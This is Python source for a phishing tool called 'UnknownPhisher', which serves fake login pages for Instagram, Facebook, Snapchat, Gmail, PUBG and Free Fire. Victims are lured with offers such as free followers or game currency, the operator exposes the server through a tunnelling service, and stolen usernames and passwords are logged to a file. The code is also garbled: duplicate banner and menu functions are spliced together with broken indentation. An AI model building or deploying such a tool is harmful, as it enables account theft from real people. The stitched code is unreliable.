import os
import sys
import time
import subprocess

# Color Codes
green = "\033[1;32m"
red = "\033[1;31m"
white = "\033[1;37m"
yellow = "\033[1;33m"

def banner():

    import os

# Define colors
red = "\033[1;31m"
yellow = "\033[1;33m"
white = "\033[1;37m"
green = "\033[1;32m"
reset = "\033[0m"

def banner():
    os.system('clear')
    print(f"{red}")
    print("  _   _ _   _ _  _ _  _  _____ _  _ _  _ ")
    print(" | | | | \ | | |/ / \ | |/ _ \ \ \ | | \ | |")
    print(" | |_| |  \| | ' /|  \| | | | |\ \ | |  \| |")
    print("  \___/|_|\__|_|\_\|_|\_|\___/  \_\|_|_|\__|")
    print(f"{yellow}         >> UnknownPhisher v1.0 <<")
    print(f"{white}         [ Created by: Kohabdull ]")
    print(f"{green}         [ Team: The Unknowns   ]")
    print(f"{white}==========================================")

def menu():
    banner()
    print(f"\n{green}[01]{white} Instagram")
    print(f"{green}[02]{white} Facebook")
    print(f"{green}[03]{white} Snapchat")
    print(f"{green}[04]{white} Gmail")
    print(f"{green}[05]{white} PUBG")
    print(f"{green}[06]{white} FreeFire")

# To run the tool
menu()

    print(f"{yellow}")
    print("               >> UnknownPhisher v1.0 <<")
    print(f"{white}              [ Created by Mr Unknown ]")
    print(f"{green}               [ Team:  The Unknown ]")
    print(f"{white}================================================================")

def menu():
    banner()
    # Tool Menu Options
    print(f"\n{green}[01]{white} Instagram (Free Followers)")
    print(f"{green}[02]{white} Facebook  (Profile Tracker)")
    print(f"{green}[03]{white} Snapchat  (Premium Filters)")
    print(f"{green}[04]{white} Gmail     (Storage Boost)")
    print(f"{green}[05]{white} PUBG/BGMI (Free UC Top-Up)")
    print(f"{green}[06]{white} Free Fire (Diamond Generator)")
    print(f"{green}[00]{white} Exit")
    
    choice = input(f"\n{yellow}[?] Select an option: {white}")
    
    if choice == '01':
        start_server("instagram")
    elif choice == '02':
        start_server("facebook")
    elif choice == '03':
        start_server("snapchat")
    elif choice == '04':
        start_server("gmail")
    elif choice == '05':
        start_server("pubg")
    elif choice == '06':
        start_server("freefire")
    elif choice == '00':
        sys.exit()
    else:
        print(f"{red}Invalid Option!{white}")
        time.sleep(2)
        menu()

def start_server(site):
    banner()
    print(f"{yellow}[*] Starting PHP Server...{white}")
    # Start Local PHP Server on Port 8080
    subprocess.Popen(['php', '-S', '127.0.0.1:8080', '-t', f'sites/{site}'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(2)
    
    print(f"{green}[+] Server Started!{white}")
    print(f"{yellow}[*] Use Cloudflared or Ngrok to get Public Link.{white}")
    print(f"\n{red}[!] Waiting for Data... (Press Ctrl+C to stop){white}\n")
    
    # Live Data Monitoring Loop
    while True:
        log_file = f"sites/{site}/usernames.txt"
        if os.path.exists(log_file):
            print(f"\n{green}[✔] NEW DATA RECEIVED! [✔]{white}")
            # Beep Sound for Termux
            os.system('printf "\a"') 
            
            # Read and Print Data
            with open(log_file, "r") as f:
                data = f.read()
                print(f"{yellow}{data}{white}")
            
            # Save Data to Main File
            with open("all_passwords.txt", "a") as main_file:
                main_file.write(f"\nTarget: {site}\n" + data + "\n" + "="*20 + "\n")
            
            # Remove Temp Log File
            os.remove(log_file)
        time.sleep(1)

if __name__ == "__main__":
    try:
        menu()
    except KeyboardInterrupt:
        print(f"\n{red}[!] Tool Stopped by User.{white}")
        sys.exit()
      
